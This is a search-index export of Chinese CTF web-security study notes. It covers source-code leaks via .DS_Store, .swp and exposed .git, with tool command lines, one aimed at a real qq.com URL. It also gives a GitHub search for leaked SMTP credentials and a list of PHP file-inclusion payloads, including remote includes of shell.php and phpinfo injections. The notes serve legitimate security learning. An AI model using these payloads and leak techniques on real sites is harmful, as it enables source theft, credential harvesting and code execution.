\u7528\u6765\u5b58\u653e\u6253\u5305\u597d\u7684\u5e93(.jar)\nWEB-INF/src/ : \u7528\u6765\u653e\u6e90\u4ee3\u7801(.asp\u548c.php\u7b49)\n</code></pre> \u901a\u8fc7\u627e\u5230 web.xml \u6587\u4ef6\uff0c\u63a8\u65ad class \u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6700\u540e\u76f4\u63a5 class \u6587\u4ef6\uff0c\u518d\u901a\u8fc7\u53cd\u7f16\u8bd1 class \u6587\u4ef6\uff0c\u5f97\u5230\u7f51\u7ad9\u6e90\u7801\u3002</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#8ds_store","title":"8\u3001DS_Store \u6587\u4ef6\u6cc4\u9732","text":"<p>.DS_Store\u662fMac\u4e0bFinder\u7528\u6765\u4fdd\u5b58\u5982\u4f55\u5c55\u793a \u6587\u4ef6/\u6587\u4ef6\u5939 \u7684\u6570\u636e\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u5bf9\u5e94\u4e00\u4e2a\u3002\u5982\u679c\u5c06.DS_Store\u4e0a\u4f20\u90e8\u7f72\u5230\u670d\u52a1\u5668\uff0c\u53ef\u80fd\u9020\u6210\u6587\u4ef6\u76ee\u5f55\u7ed3\u6784\u6cc4\u6f0f\uff0c\u7279\u522b\u662f\u5907\u4efd\u6587\u4ef6\u3001\u6e90\u4ee3\u7801\u6587\u4ef6\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1a</p> <p>github\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/lijiejie/ds_store_exp</p> <p>\u7528\u6cd5\u793a\u4f8b\uff1a</p> <pre><code>ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store\n</code></pre>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#9swp","title":"9\u3001SWP \u6587\u4ef6\u6cc4\u9732","text":"<p>swp\u5373swap\u6587\u4ef6\uff0c\u5728\u7f16\u8f91\u6587\u4ef6\u65f6\u4ea7\u751f\u7684\u4e34\u65f6\u6587\u4ef6\uff0c\u5b83\u662f\u9690\u85cf\u6587\u4ef6\uff0c\u5982\u679c\u7a0b\u5e8f\u6b63\u5e38\u9000\u51fa\uff0c\u4e34\u65f6\u6587\u4ef6\u81ea\u52a8\u5220\u9664\uff0c\u5982\u679c\u610f\u5916\u9000\u51fa\u5c31\u4f1a\u4fdd\u7559\uff0c\u6587\u4ef6\u540d\u4e3a .filename.swp\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\uff1a\u76f4\u63a5\u8bbf\u95ee.swp\u6587\u4ef6\uff0c\u4e0b\u8f7d\u56de\u6765\u540e\u5220\u6389\u672b\u5c3e\u7684.swp\uff0c\u83b7\u5f97\u6e90\u7801\u6587\u4ef6\u3002</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#10github","title":"10\u3001GitHub\u6e90\u7801\u6cc4\u6f0f","text":"<p>GitHub\u662f\u4e00\u4e2a\u9762\u5411\u5f00\u6e90\u53ca\u79c1\u6709\u8f6f\u4ef6\u9879\u76ee\u7684\u6258\u7ba1\u5e73\u53f0\u3002\u5f88\u591a\u4eba\u559c\u6b22\u628a\u81ea\u5df1\u7684\u4ee3\u7801\u4e0a\u4f20\u5230\u5e73\u53f0\u6258\u7ba1\uff0c\u901a\u8fc7\u5173\u952e\u8bcd\u8fdb\u884c\u641c\u7d22\uff0c\u53ef\u4ee5\u627e\u5230\u5173\u4e8e\u76ee\u6807\u7ad9\u70b9\u7684\u654f\u611f\u4fe1\u606f\uff0c\u751a\u81f3\u53ef\u4ee5\u4e0b\u8f7d\u7f51\u7ad9\u6e90\u7801\u3002</p> <p>\u7c7b\u4f3c\u7684\u4ee3\u7801\u6258\u7ba1\u5e73\u53f0\u8fd8\u6709\u5f88\u591a\uff0c\u4eba\u624d\u662f\u6700\u5927\u7684\u6f0f\u6d1e\u3002</p> <p><pre><code>https://github.com/search?q=smtp+user+@qq.com&amp;type=code\n</code></pre> \u53c2\u8003\u94fe\u63a5\uff1a https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#_19</p> <p>https://evilpan.com/2017/09/22/web-file-disclosure/</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/","title":"\u6e90\u7801\u6cc4\u9732","text":"<p>\u5f88\u5c11\u5f88\u5c11\u4f1a\u78b0\u5230flag\u653e\u5728\u6cc4\u9732\u51fa\u6765\u7684\u6e90\u7801\u91cc\u9762</p> <p>\u4e00\u822c\u90fd\u662f\u4ee3\u7801\u5ba1\u8ba1\uff0c\u6240\u4ee5\u4f1a\u548c\u5176\u4ed6\u5f88\u591a\u4e1c\u897f\u4ea4\u7ec7\u5728\u4e00\u8d77\uff0c\u5c5e\u4e8e\u4e00\u4e2a\u6bd4\u8f83\u4e2d\u95f4\u7684\u6a21\u5757\u3002</p> <p>\u6240\u4ee5\u8fd9\u91cc\u5e94\u8be5\u662f\u4e0d\u4f1a\u6709\u4ec0\u4e48\u4f8b\u5b50\u3002</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#dirsearch","title":"dirsearch","text":"<p>\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u8f6f\u4ef6\u7684\u540d\u79f0\uff0c\u7528\u6765\u626b\u540e\u53f0\u8def\u5f84\u7684\uff0c\u8bb2\u4e0d\u597d\u53ef\u4ee5\u626b\u51fa\u6e90\u7801\u3002</p> <p>\u5fa1\u5251\u6211\u6ca1\u7528\u8fc7hhh</p> <p>\uff08\u4f46\u662fbuu\u6709\u8bbf\u95ee\u9650\u5236\u4f1a\u7ecf\u5e38429.......\u6240\u4ee5\u8bb0\u5f97\u52a0\u53c2\u6570\uff09</p> <p>\u653e\u4e0a\u4e0b\u8f7d\u94fe\u63a5</p> <p>https://github.com/maurosoria/dirsearch</p> <p>git clone\u4e0b\u8f7d\u5c31\u80fd\u7528\u4e86\u8bb0\u5f97chmod +x</p> <p>\u7136\u540e\u7528\u6cd5\u4e00\u822c\u662f</p> <p>./dirsearch -u URL -x 404,429,500...(\u770b\u9700\u6c42) -t 5(\u7ebf\u7a0b\u6570) -d 0.1(\u8bbf\u95ee\u5ef6\u8fdf)</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#git","title":".git\u6e90\u7801\u6cc4\u9732","text":"<p>\u5f00\u53d1\u4eba\u5458\u4f1a\u4f7f\u7528 git \u8fdb\u884c\u7248\u672c\u63a7\u5236\uff0c\u5bf9\u7ad9\u70b9\u81ea\u52a8\u90e8\u7f72\u3002\u4f46\u5982\u679c\u914d\u7f6e\u4e0d\u5f53\uff0c\u53ef\u80fd\u4f1a\u5c06 .git \u6587\u4ef6\u5939\u76f4\u63a5\u90e8\u7f72\u5230\u7ebf\u4e0a\u73af\u5883\uff0c\u8fd9\u5c31\u5f15\u8d77\u4e86 git \u6cc4\u9732\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u76f4\u63a5\u83b7\u5f97\u7f51\u9875\u6e90\u7801\u3002</p> <p>\u901a\u8fc7\u7f51\u9875\u8bbf\u95ee .git \u76ee\u5f55\uff0c\u5982\u679c\u80fd\u8bbf\u95ee\u5c31\u8bf4\u660e\u5b58\u5728\uff08\u6743\u9650\u4e0d\u591f\u4e5f\u884c\uff09</p> <p>\u8981\u83b7\u53d6\u6cc4\u9732\u7684\u6e90\u7801\uff0c\u53ef\u4ee5\u4f7f\u7528 GitHack \u5de5\u5177</p> <p>python\uff082\uff09 GitHack.py url</p> <p>\u4e0b\u8f7d\u5b8c\u4e4b\u540e\u7684\u5de5\u4f5c\u57fa\u672c\u4e0a\u662f\u4ee3\u7801\u5ba1\u8ba1\u3002</p> <p>https://github.com/BugScanTeam/GitHack</p> <p>\u9700\u8981\u6ce8\u610f\u7684\uff0c\u8c8c\u4f3c\u6211\u89c1\u8fc7\u7684\u90fd\u662fpy2\u5199\u7684\uff0c\u6240\u4ee5\u9700\u8981py2\u8c03\u7528</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#git_1","title":"git\u6587\u4ef6\u4fee\u590d","text":"<p><code>git log --all</code></p> <p>\u4e00\u4e2a\u662f\u663e\u793a</p> <p><code>git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</code></p> <p>\u4e00\u4e2a\u662f\u6062\u590d</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#ds_store","title":"ds_store","text":"<p>\u5728Mac OS\u4e0a\u4f1a\u5b58\u5728\u3002</p> <p>DS_Store \u662f\u7528\u6765\u5b58\u50a8\u8fd9\u4e2a\u6587\u4ef6\u5939\u7684\u663e\u793a\u5c5e\u6027\u7684\uff1a\u6bd4\u5982\u6587\u4ef6\u56fe\u6807\u7684\u6446\u653e\u4f4d\u7f6e\u3002\u5220\u9664\u4ee5\u540e\u7684\u526f\u4f5c\u7528\u5c31\u662f\u8fd9\u4e9b\u4fe1\u606f\u7684\u5931\u53bb\u3002\uff08\u5f53\u7136\uff0c\u8fd9\u70b9\u526f\u4f5c\u7528\u5176\u5b9e\u4e0d\u662f\u592a\u5927\uff09</p> <p>\u4e3b\u8981\u662f\u5982\u679c\u62ff\u5230\u4e86\u8fd9\u4e2a\u6587\u4ef6\u7531\u4e8e\u5404\u79cd\u7f16\u7801\u7684\u539f\u56e0\u4f1a\u5f88\u96be\u53d7</p> <p>\u4e8e\u662f\u7ed9\u51fa\u4e00\u4e2a\u89e3\u6790\u8bfb\u53d6\u8fd9\u7c7b\u6587\u4ef6\u7684\u811a\u672c\uff1a</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#php","title":"php\u4f2a\u534f\u8bae","text":"<p>\u5176\u5b9e\u8fd9\u4e2a\u4e1c\u897f\u5e94\u8be5\u653e\u5728\u6587\u4ef6\u5305\u542b\u548c\u6587\u4ef6\u4e0a\u4f20\u91cc\u9762\u7684\u3002\u7ea0\u7ed3\u4e86\u4e00\u4e0b\uff0c\u4f46\u8fd8\u662f\uff0c\u51b3\u5b9a\u4e24\u4e2a\u5730\u65b9\u90fd\u653e\u7740(\u4e0d\u8fc7\u4e0d\u4f1a\u653e\u5f88\u591a\uff0c\u5927\u5934\u8fd8\u662f\u653e\u5728\u90a3\u8fb9)\uff1a</p> <p>include\u3001require\u3001include_once\u3001require_once\u3001highlight_file \u3001show_source \u3001readfile \u3001file_get_contents \u3001fopen \u3001file</p> <p>\u8fd9\u4e9b\u90fd\u662f\u5e38\u89c1\u7684\u6587\u4ef6\u5305\u542b\u51fd\u6570\u4f2a\u534f\u8bae\u4f9d\u6258\u4e8e\u8fd9\u4e9b\u51fd\u6570\u6765\u6267\u884c\u3002\u3002</p> <p>\u4ee5\u5e38\u89c1\u7684include\u4e3a\u4f8b\u597d\u4e86</p> <p>\u6700\u957f\u4f7f\u7528\u7684\u4e3aphp://filter/read=convert.base64-encode/resource=[\u6587\u4ef6\u540d]\u8bfb\u53d6\u6587\u4ef6\u6e90\u7801\uff08\u9488\u5bf9php\u6587\u4ef6\u9700\u8981base64\u7f16\u7801\uff09</p> <p>\u4f1a\u78b0\u5230include($_GET['NAME'])</p> <p>\u7136\u540e\u4f60\u4f20\u4e2a?NAME=php://filter/read=convert.base64-encode/resource=index.php</p> <p>\u8fdb\u53bb\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u62ff\u5230index.php\u7684base64\u7f16\u7801\u7684\u6e90\u7801\u3002</p> <p>\u539f\u7406\u5c31\u662f\u6587\u4ef6\u5305\u542b\uff08\u4e4b\u540e\u4ecb\u7ecd\uff09</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#php_1","title":"php\u652f\u6301\u7684\u4f2a\u534f\u8bae\u6709\uff1a","text":"<pre><code>ftp://shell.php\nfile:///tmp/shell.php\nhttp://xxxx/shell.php\n\\\\smbserver\\shell.php        //unc\u8def\u5f84\nphar://xxxx/x.zip/shell.php   //\u9700\u5c06shell.php\u6253\u5305\u4e3ax.zip\u4e0a\u4f20\nzip://xxxx/x.zip#shell.php    //\u9700\u5c06shell.php\u6253\u5305\u4e3ax.zip\u4e0a\u4f20\nphp://filter/read=convert.base64-encode/resource=shell.php\ncompress.bzip2://shell.php\ncompress.zlib://shell.jpg\nphp://input    [POST DATA] &lt;?php phpinfo()?&gt;\ndata://text/plain,&lt;?php phpinfo()?&gt;                 //\u4e5f\u53ef\u4ee5data:text/plain,&lt;?php phpinfo()?&gt;\ndata://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\nphp://filter/read=convert.base64-encode/resource=phar://phar.phar\nphp://filter/convert.base64-decode|convert.base64-decode/resource=shell.php\nphp://filter/%72ead=convert.base64-encode/resource=shell.%70hp\nPlain Text\n</code></pre> <p>\u8bfb\u6587\u4ef6\u5e38\u7528\u7684\u4e5f\u5c31php\uff1a\uff08\u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09\uff09</p> <p>\u548cfile:\uff08\u8fd8\u6709local_file,\u8fd9\u4e2a\u4e4b\u540e\u518d\u8bf4\uff0c\u597d\u50cf\u662f\u4e2acve\uff09</p> <p>\u6240\u8c13\u7684\u4f2a\u534f\u8bae\uff0c\u4e8b\u5b9e\u4e0a\u662f\u5176\u652f\u6301\u7684\u534f\u8bae\u4e0e\u5c01\u88c5\u534f\u8bae</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#google","title":"google","text":"<p>\u6709\u4e9b\u4ee3\u7801\uff08\u6bd4\u5982\u8bf4\u76f4\u63a5\u7684\u670d\u52a1\u5668\u7aef\u6846\u67b6\u6027\u7684\uff09\u8bd5\u80fd\u591f\u76f4\u63a5\u7528github\u548cgoogle\u76f4\u63a5\u641c\u7d22\u5230\u7684</p> <p>\u56e0\u6b64\u8fd9\u4e5f\u662f\u4e00\u79cd\u5f62\u5f0f\u4e0a\u7684\u6e90\u7801\u6cc4\u9732\u3002</p>"},{"location":"web_bak/changelog/","title":"Changelog","text":"<p>~\u8fd9\u91cc~\u7528\u4e8e\u8bb0\u5f55\u6587\u6863\u6240\u4f5c\u51fa\u7684\u6dfb\u52a0\u4e0e\u4fee\u6539\uff0c\u65b9\u4fbf\u5927\u5bb6\u77e5\u9053\u5728\u54ea\u6dfb\u52a0\u4e86\u4ec0\u4e48</p>"},{"location":"web_bak/readme/","title":"\u524d\u8a00","text":"<p>web\u76f8\u5173\u7684\u6280\u672f\u8d44\u6599\u6709\u5f88\u591a\uff0c\u800c\u4e14\u6211\u4eec\u80fd\u591fgoogle\u5230\u975e\u5e38\u591a\u7684\u59ff\u52bf\u3002\u5982\u4f55\u5c06\u73b0\u6709\u7684\u77e5\u8bc6\u4ee5\u4e00\u6761\u5b8c\u6574\u7684\u94fe\u7ec4\u5408\u8d77\u6765\uff0c\u662f\u6211\u8ba4\u4e3a\u7684web\u7684\u6838\u5fc3\uff0c\u9700\u8981\u575a\u6301\u4e0d\u61c8\u7684\u52aa\u529b\u5f62\u6210\u6bd4\u8f83\u5b8c\u6574\u7684\u6e17\u900f\u4f53\u7cfb\u3002\u540c\u65f6\uff0cweb\u5b83\u53c8\u5f88\u591a\u5f88\u6742\uff0c\u4e0a\u624b\u5e94\u8be5\u662f\u6700\u7b80\u5355\u7684\uff0c\u7ee7\u7eed\u5b66\u4e0b\u53bb\u5982\u679c\u4e0d\u505a\u603b\u7ed3\u7684\u8bdd\u80af\u5b9a\u4f1a\u88ab\u6df9\u6ca1\u3002\u4ee5\u4e0b\u662f\u672c\u4eba\u534a\u5e74\u4ee5\u6765\u7684\u77e5\u8bc6\u70b9\u603b\u7ed3\uff0c\u5e0c\u671b\u80fd\u591f\u5e2e\u52a9\u5927\u5bb6\u7684\u5b66\u4e60\uff0c\u6b22\u8fce\u5404\u4f4dweb\u9009\u624b\u7684\u8865\u5145\u3002\u9274\u4e8e\u672c\u4eba\u80fd\u529b\u6c34\u5e73\u6709\u9650\uff0c\u5982\u53d1\u73b0\u9519\u8bef\u8bf7\u5148\u544a\u77e5\uff0c\u7136\u540e\u4fee\u6539\u3002\u6700\u540e\uff0c\u603b\u7ed3\u53ef\u80fd\u4f1a\u6709\u90e8\u5206\u91cd\u590d\u5185\u5bb9\u653e\u5728\u4e0d\u540c\u7684\u6a21\u5757\u91cc\u9762\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4e2a\u4eba\u5e0c\u671b\u5c3d\u53ef\u80fd\u7684\u5c06\u89e3\u9898\u91cd\u5fc3\u653e\u5728\u601d\u8def\u65b9\u9762\u3002</p> <p>\u7136\u540e\u662f\u672c\u603b\u7ed3\u662f\u4e00\u4e2a\u6846\u67b6\u6027\u8d28\u7684\u4e1c\u897f\uff0c\u4e0d\u53ef\u80fd\u4f5c\u4e3a\u767e\u79d1\u4e00\u6837\u9762\u9762\u4ff1\u5230\uff0c\u4f46\u80fd\u591f\u65b9\u4fbf\u5927\u5bb6\u5bf9\u77e5\u8bc6\u505a\u597d\u7ba1\u7406\u3002\uff08\u5982\u679c\u6709\u65f6\u95f4\u7684\u8bdd\uff0c\u6211\u4e5f\u4f1a\u5199\u4e00\u70b9\u597d\u73a9\u7684\u4e1c\u897f\uff09</p> <p>\u518d\u6709\u5c31\u662f\u4e00\u4e9b\u5de5\u5177\u6027\u7684\u4e1c\u897f\u6211\u4f1a\u9009\u62e9\u6027\u7684\u4ecb\u7ecd\uff0c\u4f46\u662f\u6700\u57fa\u7840\u7684burpsuite\uff0cSwitchyOmega\u7b49\u8fd9\u4e9b\u4e1c\u897f\u8fd8\u662f\u9ed8\u8ba4\u8981\u4f1a\u7684\u3002\uff08\u4e0d\u4f1a\u7684\u81ea\u5df1\u5199\u70b9\u603b\u7ed3\u653e\u4e0a\u6765\uff09</p> <p>\u6700\u540e\u66f4\u4e3a\u8d34\u5fc3\u7684\u662f\uff0c\u5927\u90e8\u5206\u90fd\u9644\u8d60\u4f8b\u9898</p> <p></p> <p>\uff08\u4ee5\u4e0b\u6765\u81ea\u7f51\u56fe</p> <p>\u53e6\u5916\u4e00\u5f20\u592a\u5927\u4e86\uff0c\u4e0a\u4f20\u4e0d\u4e0a\u6765</p> <p></p>"},{"location":"web_bak/website/","title":"\u5de5\u5177\u7f51\u7ad9","text":"<p>\u5982\u679c\u6709\u77e5\u9053\u7684\u66f4\u591a\u7684\u8bdd\uff0c\u76f4\u63a5\u5f80\u4e0a\u642c\u8fd0\u5c31OK\u4e86\uff0c\u4e0d\u505a\u8fc7\u591a\u89e3\u91ca\u3002</p> <p>http://ctf.ssleye.com/\u91cc\u9762\u7528\u7684\u591a\u4e00\u70b9\u7684\u662f\u4e0e\u7f16\u7801\u76f8\u5173\uff0c\u5176\u4ed6\u5bc6\u7801\u5b66\uff0cmisc\u7b80\u5355\u4e00\u70b9\u7684\u4e5f\u4f1a\u7528\u5230\u3002</p> <ul> <li> <p>https://tool.bugku.com/\u57fa\u672c\u540c\u4e0a</p> </li> <li> <p>https://www.bejson.com/json\u683c\u5f0f\u5316\u6821\u9a8c</p> </li> <li> <p>https://tool.lu/coderunner/\u4ee3\u7801\u5728\u7ebf\u8fd0\u884c\uff08php\u7531\u4e8e\u7248\u672c\u592a\u591a\u7684\u95ee\u9898\u5efa\u8bae\u81ea\u5df1\u642d\uff09</p> </li> <li> <p>https://www.compart.com/en/unicode/search?q=thousand#characters\u5b57\u7b26\u8f6c\u7801\u7684\u7f51\u7ad9\uff0c\u7ecf\u5e38\u4f1a\u7528\u6765\u505a\u5b57\u7b26\u7ed5\u8fc7\uff0c\u6bd4\u5982\u8bf4\u1d00\u7b49\u7b49</p> </li> <li> <p>https://jwt.io/JWT\u52a0\u89e3\u5bc6\u7684\u7f51\u7ad9\uff0c\u5982\u679c\u770b\u5230session\u4e3a\u4e09\u6bb5\u5f0f\uff0c\u4e0d\u59a8\u653e\u8fdb\u53bb\u770b\u770b\u3002\u4f1a\u7528\u5728session\u4f2a\u9020\u4e2d\u3002\uff08Json web token\uff09</p> </li> <li> <p>https://github.com/bowu678/php_bugs\u4e00\u4e2a\u9879\u76ee\uff0c\u5173\u4e8ephp\u7684\u4ee3\u7801\u5ba1\u8ba1\u7684\u9879\u76ee\uff0c\u521d\u5b66\u7684\u8bdd\u53ef\u4ee5\u5b66\u5230\u86ee\u591a\u3002</p> </li> <li> <p>https://www.yuque.com/jxswcy/ctfnotebook\u535a\u5ba2\uff0c\u5efa\u8bae\u4e0d\u60f3\u505a\u9898\u7684\u65f6\u5019\u98df\u7528\u3002</p> </li> <li> <p>https://docs.python-requests.org/zh_CN/latest/user/quickstart.html#post-multipart-encoded\u8fd9\u4e2a\u662frequests\u5e93\u7684\u5b98\u65b9\u4e2d\u6587\u6587\u6863\uff0c\u7531\u4e8e\u5199\u811a\u672c\u80af\u5b9a\u662f\u4f1a\u7528\u5230\u7684\uff0c\u5efa\u8bae\u770b\u770b</p> </li> <li></li> </ul>"},{"location":"web_bak/Function_library/PHP/","title":"abcd","text":""},{"location":"web_bak/Function_library/PHP/#efgh","title":"efgh","text":""},{"location":"web_bak/Function_library/PHP/#f","title":"F","text":"<pre><code>file_put_contents\nfile_put_contents \u2014 \u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u5199\u5165\u6587\u4ef6\n file_put_contents ( string $filename , mixed $data , int $flags = 0 , resource $context = ? ) : int\n data :\n\n\u8981\u5199\u5165\u7684\u6570\u636e\u3002\u7c7b\u578b\u53ef\u4ee5\u662f string\uff0carray \u6216\u8005\u662f stream \u8d44\u6e90\uff08\u5982\u4e0a\u9762\u6240\u8bf4\u7684\u90a3\u6837\uff09\u3002 \n\n flags: \n\nflags \u7684\u503c\u53ef\u4ee5\u662f \u4ee5\u4e0b flag \u4f7f\u7528 OR (|) \u8fd0\u7b97\u7b26\u8fdb\u884c\u7684\u7ec4\u5408\u3002 \n\n context\n\n\u4e00\u4e2a context \u8d44\u6e90\u3002\u00a0\n</code></pre>"},{"location":"web_bak/Function_library/PHP/#_1","title":"abcd","text":""},{"location":"web_bak/Function_library/PHP/#ijkl","title":"ijkl","text":""},{"location":"web_bak/Function_library/PHP/#mnop","title":"mnop","text":""},{"location":"web_bak/Function_library/PHP/#m","title":"m","text":"<p>'</p>"},{"location":"web_bak/Function_library/PHP/#n","title":"n","text":""},{"location":"web_bak/Function_library/PHP/#o","title":"o","text":""},{"location":"web_bak/Function_library/PHP/#p","title":"p","text":""},{"location":"web_bak/Function_library/PHP/#qrst","title":"qrst","text":""},{"location":"web_bak/Function_library/PHP/#q","title":"Q","text":""},{"location":"web_bak/Function_library/PHP/#r","title":"R","text":""},{"location":"web_bak/Function_library/PHP/#s","title":"S","text":""},{"location":"web_bak/Function_library/PHP/#scandir","title":"scandir","text":"<p>scandir() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u548c\u76ee\u5f55\u7684\u6570\u7ec4\u3002</p>"},{"location":"web_bak/Function_library/PHP/#stristr","title":"stristr()","text":"<p>\u51fd\u6570\u641c\u7d22\u5b57\u7b26\u4e32\u5728\u53e6\u4e00\u5b57\u7b26\u4e32\u4e2d\u7684\u7b2c\u4e00\u6b21\u51fa\u73b0\u3002</p> <p>\u6ce8\u91ca\uff1a\u8be5\u51fd\u6570\u662f\u4e8c\u8fdb\u5236\u5b89\u5168\u7684\u3002</p> <p>\u6ce8\u91ca\uff1a\u8be5\u51fd\u6570\u662f\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\u3002\u5982\u9700\u8fdb\u884c\u533a\u5206\u5927\u5c0f\u5199\u7684\u641c\u7d22\uff0c\u8bf7\u4f7f\u7528 strstr() \u51fd\u6570\u3002</p>"},{"location":"web_bak/Function_library/PHP/#t","title":"T","text":""},{"location":"web_bak/Function_library/PHP/#uvwxyz","title":"uvwxyz","text":""},{"location":"web_bak/Function_library/PHP/#u","title":"U","text":""},{"location":"web_bak/Function_library/PHP/#unlink","title":"unlink","text":"<p>unlink() \u51fd\u6570\u5220\u9664\u6587\u4ef6\u3002</p> <p>\u82e5\u6210\u529f\uff0c\u5219\u8fd4\u56de true\uff0c\u5931\u8d25\u5219\u8fd4\u56de false\u3002</p> <p>unlink(filename,context)</p>"},{"location":"web_bak/Function_library/python/","title":"abcd","text":""},{"location":"web_bak/Function_library/python/#efgh","title":"efgh","text":""},{"location":"web_bak/Function_library/python/#ijkl","title":"ijkl","text":""},{"location":"web_bak/Function_library/python/#mnop","title":"mnop","text":""},{"location":"web_bak/Function_library/python/#qrst","title":"qrst","text":""},{"location":"web_bak/Function_library/python/#uvwxyz","title":"uvwxyz","text":""},{"location":"web_bak/XSS_CSS_CSP/csp/CSP/","title":"CSP","text":"<p>\u5185\u5bb9\u5b89\u5168\u7b56\u7565\u6216CSP\u662f\u4e00\u79cd\u5185\u7f6e\u7684\u6d4f\u89c8\u5668\u5b89\u5168\u63aa\u65bd\uff0c\u7528\u4e8e\u9632\u5fa1\u8de8\u7ad9\u70b9\u811a\u672c\uff08XSS\uff09\u7b49Web\u653b\u51fb\u3002\u8be5\u7b56\u7565\u7684\u89c4\u5219\u7528\u4e8e\u5b9a\u4e49\u4e00\u7ec4\u6d4f\u89c8\u5668\u53ef\u4ee5\u5b89\u5168\u5730\u4ece\u4e2d\u52a0\u8f7d\u5185\u5bb9\u7684\u8def\u5f84\u548c\u6e90\uff0c\u5e76\u7ed9\u51fa\u76f8\u5e94\u7684\u63cf\u8ff0\u3002\u5176\u4e2d\uff0c\u8fd9\u4e9b\u8d44\u6e90\u5305\u62ec\u56fe\u50cf\u3001frame\u3001javascripts\u7b49\u3002</p> <p>\u4e00\u4e2aCSP\u5934\u7531\u591a\u7ec4CSP\u7b56\u7565\u7ec4\u6210\uff0c\u4e2d\u95f4\u7531\u5206\u53f7\u5206\u9694\uff0c\u5c31\u50cf\u8fd9\u6837\uff1a</p> <pre><code>Content-Security-Policy: default-src 'self' www.baidu.com; script-src 'unsafe-inline'\n</code></pre> <p>\u5176\u4e2d\u6bcf\u4e00\u7ec4\u7b56\u7565\u5305\u542b\u4e00\u4e2a\u7b56\u7565\u6307\u4ee4\u548c\u4e00\u4e2a\u5185\u5bb9\u6e90\u5217\u8868</p> <p>\u4e00\u3001\u5e38\u7528\u7684\u7b56\u7565\u6307\u4ee4\uff1a</p>"},{"location":"web_bak/XSS_CSS_CSP/csp/CSP/#default-src","title":"default-src","text":"<p>default-src \u6307\u4ee4\u5b9a\u4e49\u4e86\u90a3\u4e9b\u6ca1\u6709\u88ab\u66f4\u7cbe\u786e\u6307\u4ee4\u6307\u5b9a\u7684\u5b89\u5168\u7b56\u7565\u3002\u8fd9\u4e9b\u6307\u4ee4\u5305\u62ec\uff1a</p> <p>child-srcchild-src \u6307\u5b9a\u5b9a\u4e49\u4e86 web workers \u4ee5\u53ca\u5d4c\u5957\u7684\u6d4f\u89c8\u4e0a\u4e0b\u6587\uff08\u5982<code>&lt;frame&gt;</code>\u548c<code>&lt;iframe&gt;</code>\uff09\u7684\u6e90\u3002</p> <ul> <li> <p>connect-srcconnect-src\u5b9a\u4e49\u4e86\u8bf7\u6c42\u3001XMLHttpRequest\u3001WebSocket \u548c EventSource \u7684\u8fde\u63a5\u6765\u6e90\u3002</p> </li> <li> <p>font-srcfont-src\u5b9a\u4e49\u4e86\u5b57\u4f53\u52a0\u8f7d\u7684\u6709\u6548\u6765\u6e90</p> </li> <li> <p>img-srcimg-src\u5b9a\u4e49\u4e86\u9875\u9762\u4e2d\u56fe\u7247\u548c\u56fe\u6807\u7684\u6709\u6548\u6765\u6e90</p> </li> <li></li> <li>media-src</li> <li>object-src</li> </ul> <p>script-srcscript-src\u5b9a\u4e49\u4e86\u9875\u9762\u4e2dJavascript\u7684\u6709\u6548\u6765\u6e90</p> <ul> <li> <p>style-srcstyle-src\u5b9a\u4e49\u4e86\u9875\u9762\u4e2dCSS\u6837\u5f0f\u7684\u6709\u6548\u6765\u6e90</p> </li> <li></li> 